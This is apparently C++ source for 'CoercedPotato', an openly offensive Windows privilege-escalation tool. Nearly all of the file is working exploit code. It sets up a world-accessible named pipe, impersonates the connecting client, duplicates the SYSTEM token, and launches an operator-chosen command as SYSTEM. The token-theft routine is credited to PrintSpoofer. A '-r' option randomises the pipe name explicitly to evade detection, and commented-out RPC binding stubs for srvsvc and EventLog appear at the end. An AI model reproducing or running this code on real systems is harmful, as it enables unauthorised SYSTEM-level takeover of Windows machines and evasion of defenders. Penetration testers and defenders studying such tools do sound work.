#pragma once

#include <iostream>
#include <Windows.h>
#include <sddl.h>
#include <userenv.h>
#include <thread>
#include <tchar.h>
#include <string>
#include <locale>
#include <functional>
#include <rpc.h> 
#include <strsafe.h>
#include <winsdkver.h>
#define _WIN32_WINNT 0x0601
#include <sdkddkver.h>
#include <random>

#include "CLI11.hpp"

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

LPWSTR g_pwszCommandLine = NULL;
BOOL g_bInteractWithConsole = true;

struct NamedPipeThreadArgs {
    LPWSTR commandLine;
    const wchar_t* pipePath;
};

wchar_t* generateRandomString() {
    static const wchar_t caracteresPermis[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    static const int tailleCaracteresPermis = sizeof(caracteresPermis) / sizeof(wchar_t);
    std::mt19937 generateur(std::random_device{}());
    int l = (generateur()) % 25 + 1;
    wchar_t* randomString = new wchar_t[l + 1];
    for (int i = 0; i < l; ++i) {
        randomString[i] = caracteresPermis[generateur() % tailleCaracteresPermis];
    }
    randomString[l] = L'\0';

    return randomString;
}

void handleError(long result) {
    wprintf(L"[*] Error code returned : %ld\r\n", result);
    if (result == 53) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else if (result == 5) {
        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
    }
    else if (result == 50) {
        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
    }
    else if (result == 0) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else {
        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
    }
}

// CODE STOLEN FROM https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp
BOOL GetSystem(HANDLE hPipe)
{
    DWORD g_dwSessionId = 0;
    BOOL bResult = FALSE;
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    if (!ImpersonateNamedPipeClient(hPipe))
    {
        wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (g_dwSessionId)
    {
        if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
        {
            wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
        goto cleanup;

    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

    if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
    {
        if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
        {
            wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

            RevertToSelf();

            if (!g_bInteractWithConsole)
            {
                if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                {
                    wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
                    goto cleanup;
                }
                else
                {
                    wprintf(L" ** Exploit completed **\n\n");
                }
            }
            else
            {
                wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
                goto cleanup;
            }
        }
        else
        {
            wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }
    else
    {
        wprintf(L" ** Exploit completed **\n\n");
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    bResult = TRUE;

cleanup:
    if (hSystemToken)
        CloseHandle(hSystemToken);
    if (hSystemTokenDup)
        CloseHandle(hSystemTokenDup);
    if (pwszCurrentDirectory)
        free(pwszCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return bResult;
}

DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
    NamedPipeThreadArgs* args = static_cast<NamedPipeThreadArgs*>(lpParam);
    LPWSTR commandLine = args->commandLine;
    const wchar_t* pipePath = args->pipePath;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE hTokenDup = INVALID_HANDLE_VALUE;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    HANDLE hToken = ((HANDLE)(LONG_PTR)-1);
    LPWSTR lpName;

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintfW(lpName, MAX_PATH, pipePath);


    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
    {
        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
        ConnectNamedPipe(hPipe, NULL);
        wprintf(L"\n[PIPESERVER] A client connected!\n\n");
        if (!GetSystem(hPipe)) {
            wprintf(L"[PIPESERVER] CreateNamedPipe() failed. Error: %d - ", GetLastError());
        }
    }
    return 0;
}

BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
    HANDLE hThread = NULL;
    NamedPipeThreadArgs poisonedNamedPipe;
    poisonedNamedPipe.pipePath = namedpipe;
    poisonedNamedPipe.commandLine = commandExecuted;
    launchNamedPipeServer(&poisonedNamedPipe);
    wprintf(L"[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe %s.\r\n", poisonedNamedPipe.pipePath);
    return TRUE;
}

BOOL exploitMsEfsr(wchar_t* command, std::wstring randomNamedpipe) {
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));

    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\");
    StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
    //StringCchCat(namedpipe, MAX_PATH, L"coerced");
    StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\srvsvc");

    if (!createNamedPipe(namedpipe, command)) {
        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
        return FALSE;
    }
}


int main(int argc, char** argv)
{
    std::cout << "                                                                  " << std::endl;
    std::cout << "   ____                            _ ____       _        _        " << std::endl;
    std::cout << "  / ___|___   ___ _ __ ___ ___  __| |  _ \\ ___ | |_ __ _| |_ ___  " << std::endl;
    std::cout << " | |   / _ \\ / _ \\ '__/ __/ _ \\/ _` | |_) / _ \\| __/ _` | __/ _ \\ " << std::endl;
    std::cout << " | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |" << std::endl;
    std::cout << "  \\____\\___/ \\___|_|  \\___\\___|\\__,_|_|   \\___/ \\__\\__,_|\\__\\___/ " << std::endl;
    std::cout << "                                                                  " << std::endl;
    std::cout << "                                           @Hack0ura @Prepouce    " << std::endl;
    std::cout << "                                                                  " << std::endl;


    CLI::App app{ "CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken." };

    if (argc == 1) {
        wprintf(L"Use --help to show all usefull information.\r\n");
        wprintf(L"[-] Exiting...\r\n");
        exit(0);
    }

    std::string stringCommand;

    app.add_option("-c,--command", stringCommand, "Program to execute as SYSTEM (i.e. cmd.exe)")->required();

    bool interactive = true;
    app.add_option("--interactive", interactive, "Set wether the process should be run within the same shell or open a new window. (Default value : true)");

    bool random = false;
    app.add_option("-r", random, "Use random namedpipe to avoid detection (Default value : false)");


    CLI11_PARSE(app, argc, argv);

    const char* charPointer = stringCommand.c_str();
    size_t maxBufferSize = stringCommand.size() + 1;
    wchar_t* command = new wchar_t[maxBufferSize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);
    std::wstring randomNamedpipe = L"coerced";
    if (random)
    {
        randomNamedpipe = generateRandomString();
    }
    g_pwszCommandLine = command;
    g_bInteractWithConsole = interactive;


    exploitMsEfsr(command, randomNamedpipe);

    return 0;

}



/*
handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
{
    handle_t hBinding = NULL;
    RPC_WSTR pszStringBinding;
    long status;

    wprintf(L"SRVSVC_HANDLE_bind() called\n");

    status = RpcStringBindingComposeW(NULL,(RPC_WSTR) L"ncacn_np", (RPC_WSTR)pszSystemName, (RPC_WSTR) L"\\pipe\\srvsvc", NULL, &pszStringBinding);


    if (status)
    {
        wprintf(L"RpcStringBindingCompose returned %ld\n", status);
        return NULL;
    }
    status = RpcBindingFromStringBindingW(pszStringBinding,
        &hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFromStringBinding returned %ld\n", status);
    }

    status = RpcStringFreeW(&pszStringBinding);
    if (status)
    {
        //        TRACE("RpcStringFree returned 0x%x\n", status);
    }

    return hBinding;
}


void __RPC_USER
SRVSVC_HANDLE_unbind(SRVSVC_HANDLE pszSystemName,
    handle_t hBinding)
{
    RPC_STATUS status;

    wprintf(L"SRVSVC_HANDLE_unbind() called\n");

    status = RpcBindingFree(&hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFree returned 0x%x\n", status);
    }
}


handle_t __RPC_USER
EVENTLOG_HANDLE_A_bind(EVENTLOG_HANDLE_A UNCServerName)
{
    handle_t hBinding = NULL;
    RPC_CSTR pszStringBinding;
    RPC_STATUS status;


    status = RpcStringBindingComposeA(NULL,
        (RPC_CSTR)"ncacn_np",
        (RPC_CSTR)UNCServerName,
        (RPC_CSTR)"\\pipe\\EventLog",
        NULL,
        &pszStringBinding);
    if (status)
    {
        return NULL;
    }

    status = RpcBindingFromStringBindingA(pszStringBinding,
        &hBinding);

    status = RpcStringFreeA(&pszStringBinding);

    return hBinding;
}


void __RPC_USER
EVENTLOG_HANDLE_A_unbind(EVENTLOG_HANDLE_A UNCServerName,
    handle_t hBinding)
{
    RPC_STATUS status;

    status = RpcBindingFree(&hBinding);
}


handle_t __RPC_USER
EVENTLOG_HANDLE_W_bind(EVENTLOG_HANDLE_W UNCServerName)
{
    handle_t hBinding = NULL;
    RPC_WSTR pszStringBinding;
    RPC_STATUS status;

    status = RpcStringBindingComposeW(NULL,
        (RPC_WSTR) L"ncacn_np",
        (RPC_WSTR) UNCServerName,
        (RPC_WSTR) L"\\pipe\\EventLog",
        NULL,
        &pszStringBinding);
    if (status != RPC_S_OK)
    {
        return NULL;
    }

    status = RpcBindingFromStringBindingW(pszStringBinding,
        &hBinding);

    status = RpcStringFreeW(&pszStringBinding);

    return hBinding;
}


void __RPC_USER
EVENTLOG_HANDLE_W_unbind(EVENTLOG_HANDLE_W UNCServerName,
    handle_t hBinding)
{
    RPC_STATUS status;

    status = RpcBindingFree(&hBinding);
}*/